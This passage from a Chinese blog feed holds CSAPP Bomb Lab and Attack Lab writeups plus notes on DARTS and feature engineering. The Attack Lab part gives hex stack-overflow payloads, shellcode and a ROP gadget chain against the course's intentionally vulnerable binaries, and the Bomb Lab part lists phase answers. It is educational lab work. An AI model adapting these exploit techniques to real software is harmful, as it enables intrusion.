class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+18h] [rbp-60h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+50h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v1 = v15;</span><br><span class="line">  read_six_numbers(a1, v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb(a1, v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v1 == v15[v3] )</span><br><span class="line">        explode_bomb(a1, v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)v15;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">7</span> - *(_DWORD *)v4;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v16 );</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v15[v5 / <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_QWORD *)v6[<span class="number">1</span>];</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != v8 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(__int64 *)((<span class="keyword">char</span> *)&amp;v17 + <span class="number">2</span> * v5) = (__int64)v6;</span><br><span class="line">    v5 += <span class="number">4L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = &amp;v18;</span><br><span class="line">  <span class="keyword">for</span> ( i = v17; ; i = v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *(_QWORD *)v10;</span><br><span class="line">    *(_QWORD *)(i + <span class="number">8</span>) = *(_QWORD *)v10;</span><br><span class="line">    v10 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == &amp;v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(v12 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v9 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)result )</span><br><span class="line">      explode_bomb(a1, &amp;v19);</span><br><span class="line">    v9 = *(_QWORD *)(v9 + <span class="number">8</span>);</span><br><span class="line">    --v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们画一画这个函数的栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00 rbp</span><br><span class="line">0x08</span><br><span class="line">0x10</span><br><span class="line">0x18</span><br><span class="line">0x20</span><br><span class="line">0x28 char v19[0x28] 0ll</span><br><span class="line">0x30               &amp;node[v15[5]]</span><br><span class="line">0x38               &amp;node[v15[4]]</span><br><span class="line">0x40               &amp;node[v15[3]]</span><br><span class="line">0x48               &amp;node[v15[2]]</span><br><span class="line">0x50 char v18      &amp;node[v15[1]]  &lt;- v10</span><br><span class="line">0x58 long long v17 &amp;node[v15[0]]  v9</span><br><span class="line">0x60 char v16</span><br><span class="line">0x64 v15[5]</span><br><span class="line">0x68 v15[4]</span><br><span class="line">0x6c v15[3]</span><br><span class="line">0x70 v15[2]</span><br><span class="line">0x74 v15[1]</span><br><span class="line">0x78 v15[0]</span><br></pre></td></tr></table></figure>
<p>这个栈的图片非常非常重要，首先先保证不会乱，因为后面还有跳出栈外的过程。</p>
<p>还有，在分析的过程中，时刻注意每一个变量到底是值，还是指针！千万不能错！</p>
<p>一步一步分析，不要急，一定要慢慢来：</p>
<p>最开始，从<code>v15</code>开始，读入6个<code>int</code>类型的整数，存在栈上。（<code>v15</code>是个指针）</p>
<p>第一个是嵌套循环，<code>v1</code>是当前遍历到的元素的指针，<code>v2</code>表示第几个元素（从1开始数），<code>v3</code>是循环变量。</p>
<p>每次遍历<code>v1</code>，都必须保证<code>1 &lt;= *v1 &lt;= 6</code>，关于强转unsigned int的知识点，在最后有总结。然后内层循环表示后面的元素都得跟前面的不一样，意思就是这6个数各不相同。</p>
<p>第二个是单个do-while循环。它做的就是把这6个数都运算一遍，把<code>x</code>变成了<code>7-x</code>，更改了这6个数。</p>
<p>第三个开始烧脑了！<code>v8</code>是循环中被遍历到的值，根据<code>v8</code>的数值大小，分别执行若干次从<code>&amp;node1</code>开始的<code>v8 - 1</code>次地址跳转，最终把栈上原来数组的值重新写为跳转到最后的地址。</p>
<p>这里注意一下，<code>v6 = (_QWORD *)v6[1];</code>这句代码是伏笔！（为什么这个值可以强转为地址呢？）</p>
<p>我们点进<code>node1</code>，发现在data段，后面刚好延伸到<code>node6</code>结束，这是什么意思？</p>
<p>不懂，我们看到下一个代码部分：</p>
<p>一个for循环，从<code>v17</code>即<code>rbp - 0x58</code>开始，每次循环结束会跳转到<code>v10</code>的值。之所以可以直接迭代为<code>v10</code>的值，是因为这个数组在第三次操作的时候已经变成了指针数组了！</p>
<p>接下来又是一句意味深长的代码：<code>*(_QWORD *)(i + 8) = *(_QWORD *)v10;</code></p>
<p>我们在IDA开始乱了，用gdb看一看有没有线索，毕竟还没有查过那段<code>&amp;node1</code>的奇妙地址。结果非常的意外：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase6_node.png">
<p>不知为什么，每一个node元素，他的第三个数字，恰好跟下一个node的地址一模一样！</p>
<p>其实突破点就出来了：</p>
<p><strong>每一个node是一个struct类型！</strong></p>
<p><strong>node里面的第三个数字，代表着下一个元素的地址！</strong></p>
<p><strong>这就是链表的汇编！</strong></p>
<p>其他的数字是啥意思呢？第一个数字对应节点的值，第二个数字是id，第三个数字是地址，然后怎么有空出来的0？</p>
<p>不是空出来的0，而是因为地址就是64位的！</p>
<p>在这里，结构体内的元素顺序不同，所占用的空间也会不同，这个在CSAPP中有提到过内存对齐的概念！</p>
<p>那为什么上面的那个伏笔，对应的下标是1呢？</p>
<p>因为<code>v6</code>就是一个<code>QWORD</code>类型，而node里面的数字都是int，只有32位呀！</p>
<p>接下来就非常简单了，最后一个循环所代表的，就是确保最终的数值是降序排列的。</p>
<p>所以最终的排序是924 &gt; 691 &gt; 477 &gt; 443 &gt; 332 &gt; 168，即<code>3 4 5 6 1 2</code>。</p>
<p>别忘记了前面有一个<code>x = 7 - x;</code>，所以最终的答案就是<code>4 3 2 1 6 5</code>。</p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret phase"></a>secret phase</h2><p><del>待补充，今天晚点再做了补上。（咕咕咕）</del></p>
<p>Jan 15 upd：来补上secret phase了！</p>
<h3 id="怎么进secret-phase"><a href="#怎么进secret-phase" class="headerlink" title="怎么进secret phase"></a>怎么进secret phase</h3><p><code>secret_phase</code>函数的入口其实在<code>phase_defused</code>里面。</p>
<p>懒得看汇编，直接用IDA Pro做了。<del>其实反汇编出来的跟看汇编也差不多</del></p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase_defused(IDA).png">
<p>这里看到一个<code>num_input_strings</code>，是个在bss段上的全局变量。同时，<code>sscanf</code>所读入的那个地址，也是在bss段上的，初始化都是0，不过可能会在函数执行的时候被修改。</p>
<p>那到底是什么时候被修改的？我们分别用gdb设断点看一看。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(num_input_strings).png">
<p>可以发现这个变量的意思就是记录现在是第几关。所以当第六关的时候就可以了。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(input_strings).png">
<p>可以发现是我们在打phase 4的时候，这个<code>input_strings + 240</code>所在的字符串就更改成了我们输入的内容。并且后面不会再更改。</p>
<p>所以我们只需要在第四阶段，在第三个位置上输入一个<code>DrEvil</code>，就可以在过完第六关之后触发了。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(IDA).png">
<p>要使这个<code>func7</code>返回2，并且输入的数字小于等于0x3e8 + 1，就可以通关了。</p>
<p>这里有一个<code>&amp;n1</code>，点进去看看，又是在data段，跟前面的<code>&amp;node1</code>很类似。并且，<code>n1</code>后面也紧跟着其他类似的东西，应该又是一个struct。</p>
<p>我们用gdb看一看：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(n1).png">
<p>可以发现，每个结构体储存了两个地址，我们做下笔记：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n1(n21, n22)  36</span><br><span class="line">n21(n31, n32) 8</span><br><span class="line">n22(n33, n34) 50</span><br><span class="line">n32(n43, n44) 22</span><br><span class="line">n33(n45, n46) 45</span><br><span class="line">n31(n41, n42) 6</span><br><span class="line">n34(n47, n48) 107</span><br><span class="line">n45 40</span><br><span class="line">n41 1</span><br><span class="line">n47 99</span><br><span class="line">n44 35</span><br><span class="line">n42 7</span><br><span class="line">n43 20</span><br><span class="line">n46 47</span><br><span class="line">n48 1001</span><br></pre></td></tr></table></figure>
<p>这种一对二的关系，其实就是二叉树：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                n1</span><br><span class="line">      n21             n22</span><br><span class="line">  n31     n32     n33     n34</span><br><span class="line">n41 n42 n43 n44 n45 n46 n47 n48</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/func7(IDA).png">
<p>想让<code>func7</code>为2，首先要落向左边，然后落向右边，然后返回0，这样就能构造出<code>2 * (2 * 0 + 1) = 2</code>了。</p>
<p>最后的返回0，也可以走左边再返回0，所以<code>n32</code>和<code>n43</code>的值都是没问题的，即我们有20跟22两个答案。</p>
<p>终于通关了！芜湖起飞！</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/success.png">
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/success1.png">
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/success2.png">
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Attack Lab Writeup</title>
    <url>/2021/01/17/CSAPP-Attack-Lab-Writeup/</url>
    <content><![CDATA[<p>今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><del>最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来</del></p>
<p><code>hex2raw</code>读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。</p>
<p>直接运行<code>ctarget</code>或<code>rtarget</code>会没办法运行，报了个<code>Running on an illegal host</code>的错误。</p>
<p>我们加个<code>-q</code>的参数就能跑了。或者<code>-i</code>然后加上文件名，从文件里读入。</p>
<p>运行的方法是这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;ctarget -q</span><br><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;rtarget -q</span><br></pre></td></tr></table></figure>
<h2 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h2><p>这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个<code>Gets</code>函数里面看看汇编其实是没有的。</p>
<p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
<p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
<p>构造shellcode当然先写汇编，有两种写法：</p>
<h4 id="已知cookie再写入"><a href="#已知cookie再写入" class="headerlink" title="已知cookie再写入"></a>已知cookie再写入</h4><p>在<code>cookie.txt</code>里面就有cookie的值，我们只要把这个值赋给rdi就可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>因为是AT&amp;T语法，所以可以直接用<code>gcc -c</code>编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。</p>
<p><code>ret</code>命令相当于一个<code>pop rip</code>，将<code>rip</code>指向了<code>0x4017ec</code>，即调用了<code>touch2</code>。</p>
<p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
<p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
<p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
<h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
<p>Jan 17 upd：第二种shellcode的汇编也可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq 0x006044e4, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>mov和lea的区别，就是mov会做一次dereference，而lea只进行计算。</p>
<p>只要mov的src不是一个immediate（最前面有一个$号）而是一个地址，默认都会把src这个地址dereference之后的值赋给dest。而lea就只是单纯计算之后把结果赋给dest。</p>
<p>对寄存器的dereference，还是打一个括号。上述强调的是immediate和memory的一个区别。</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个要求我们继续利用那个漏洞跳入<code>touch3</code>，顺便携带一个字符串地址，还要跑过<code>hexmatch</code>函数的检测。</p>
<p>我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。</p>
<p>我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。</p>
<p>所以我们要弄到”59b997fa”这段字符串，实际上写入的时候就得写入ASCII码了。</p>
<p>但是不能随便在栈里面随便找个地方存，因为后面执行<code>hexmatch</code>时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。</p>
<p>shellcode部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这里 解释一下：<code>0x5561dca8 = 0x5561dc78 + 0x28 + 0x8</code></p>
<p>把它翻译成机器码，粘在字符串里：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
<p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
<h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
<p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
<p>而我们大可直接用ROPgadget来做。。。</p>
<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。</p>
<p>略。</p>
<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>现在就是真正的拼gadget了。</p>
<p>这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。</p>
<p>在看别人博客的时候，看见一个非常非常重要的gadget：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br></pre></td></tr></table></figure>
<p>只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。</p>
<p>开始扫gadget：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--only &quot;mov|ret&quot;</span><br><span class="line">0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret</span><br><span class="line">0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret</span><br><span class="line">0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret</span><br><span class="line">0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret</span><br><span class="line">0x0000000000402dd7 : mov eax, 0 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--only &quot;pop|ret&quot;</span><br><span class="line">0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000004011aa : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000401dab : pop rbx ; ret</span><br><span class="line">0x000000000040141b : pop rdi ; ret</span><br><span class="line">0x0000000000402b17 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401383 : pop rsi ; ret</span><br><span class="line">0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000004021d8 : pop rsp ; pop r13 ; ret</span><br><span class="line">0x00000000004018f8 : pop rsp ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<p>（略去了一部分没用的gadget）</p>
<p>我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。</p>
<p>接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。</p>
<p>最后mov到rdi上，就可以跳转到<code>touch3</code>了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00</span><br><span class="line">40 00 00 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>DARTS Learning Note</title>
    <url>/2021/03/01/DARTS-Learning-Note/</url>
    <content><![CDATA[<p>NNI学生项目居然要让人用DARTS设计一个搜索空间？？？害没办法只能学一下咯。</p>
<p>DARTS全称Differentiable Architecture Search，是NAS中著名的算法之一。该算法的特色是将若干个待搜索的架构从互不关联的“黑箱优化”问题变成可松弛的连续优化问题，通过梯度下降来进行更新。</p>
<p>由于需求只是构造MobileNet的搜索空间，这里只对CNN的DARTS进行分析。</p>
<p>首先，如果将一个状态看作一个节点，把一种操作看作一条边，那么CNN的网络模型就可以抽象成一个有向无环图（DAG）。</p>
<p>而在我们进行搜索的过程中，两点之间其实包含有“重边”。这些“重边”虽然两端节点相同，但各代表着不同的操作。我们需要做的，就是在这些待选边中找出整体最适合的一条边来成为DAG的一部分，实现架构的搜索。</p>
<p>我们首先给cell下定义。一个cell是一个包含了$N$个节点的有向无环图。其中编号为$i$的节点$x^{(i)}$代表着特征所存在着的状态，而从$i$到$j$的一条有向边就代表着一种操作，这种操作记为$o^{(i,j)}$。</p>
<p>接下来定义cell的输入与输出。一个cell会有两个输入，而只会有一个输出。这个cell的输出是将所有前面节点的操作concat起来的结果。用公式写出来就是：</p>
<script type="math/tex; mode=display">x^{(j)} = \int_{i<j} o^{(i, j)}(x^{(i)})</script><p>这里$o^{(i,j)}(x)$代表着将$x$所代表的状态经过$(i,j)$这条有向边所代表的操作后所得到的新状态。正如直观感觉一般，也就是可以抽象成一个函数。</p>
<p>一条边所代表的，可以是一个池化层，可以是标准的conv+bn，也可以是skipconnect等其他的子模型。</p>
<p>定义的这些模型只需要满足一个共性：需要满足原数据的width和height不能改变。也就是类似于：</p>
<p>当卷积核size为3x3时，padding为1；当kernal size为5x5时，padding为2；当kernal size为1x1时，padding为0…</p>
<p>接下来令$x^{(i)}$和$x^{(j)}$这两点之间的$n$条所有候选边的集合为$\mathcal{O}$，$\alpha_o^{(i,j)}$是一个$n$维的向量，分别代表着每一个待选操作的得分。将这些得分进行softmax运算进行松弛，公式如下：</p>
<script type="math/tex; mode=display">\overline o^{(i,j)}(x) = \sum_{o\in \mathcal{O}}\frac{\exp(\alpha_o^{(i,j)})}{\sum_{o'\in \mathcal{O}} \exp(\alpha_{o'}^{(i,j)})}o(x)</script><p>$\overline o^{(i,j)}(x)$最终最可能会选中得分最高的架构，即：</p>
<script type="math/tex; mode=display">o^{(i,j)}=\argmax_{o\in \mathcal{O}}\alpha_o^{(i,j)}</script><p>最终我们所求的是集合$\alpha=\{\alpha^{(i,j)}\}$。</p>
<p>如何求得$\alpha$？我们需要训练集和验证集的协助。</p>
<p>设训练集和验证集的loss分别为$\mathcal L_{train}$和$\mathcal L_{val}$。我们要求$\alpha$，最理想的状况是存在最优架构$\alpha^<em>$, 能够使得$\mathcal L_{val}(w^</em>, \alpha^<em>)$达到最小。而最优参数$w^</em>$是通过训练集不断地训练出来的。也就是$w^<em>=\argmin_w \mathcal L_{train}(w, \alpha^</em>)$。</p>
<p>这样就需要解决一个双优化问题：</p>
<script type="math/tex; mode=display">\begin{aligned}
    & \min_\alpha \mathcal L_{val}(w^*, \alpha^*) \\
    &s. t. \quad w^*=\argmin_w \mathcal L_{train}(w, \alpha^*)
\end{aligned}</script><p>算法大体的思路是：</p>
<p>固定架构参数，用训练数据集训练模型参数；</p>
<p>固定模型参数，用验证数据集训练架构参数。</p>
]]></content>
  </entry>
  <entry>
    <title>Feature Engineering Learning Notes</title>
    <url>/2021/01/27/Feature-Engineering-Learning-Notes/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><h3 id="特征的定义"><a href="#特征的定义" class="headerlink" title="特征的定义"></a>特征的定义</h3><p>feature就是从数据中提取出来的有用的属性。</p>
<h3 id="特征工程的定义"><a href="#特征工程的定义" class="headerlink" title="特征工程的定义"></a>特征工程的定义</h3><p>特征工程(Feature Engineering)是机器学习中的一个重要分支，指的是通过运用多种数据处理方法，将把原始数据转化成更好的特征的过程。</p>
<p>特征有优劣之分，更好的特征更适合机器学习，意味着能够训练出更好的结果。</p>
<h2 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h2><h3 id="去除异常数据"><a href="#去除异常数据" class="headerlink" title="去除异常数据"></a>去除异常数据</h3><p>特征清洗即在数据中去除异常数据。常见的去除异常数据方式可以基于简单统计方法借助$3\delta$原则来去除，也可以用KNN算法等内容来处理。</p>
<h3 id="处理缺失数据"><a href="#处理缺失数据" class="headerlink" title="处理缺失数据"></a>处理缺失数据</h3><p>拿数据来训练自然需要各类数据数量较均匀，有缺失会对模型准确度造成影响。</p>
<p>至于如何处理缺失数据，有几个原则：</p>
<ol>
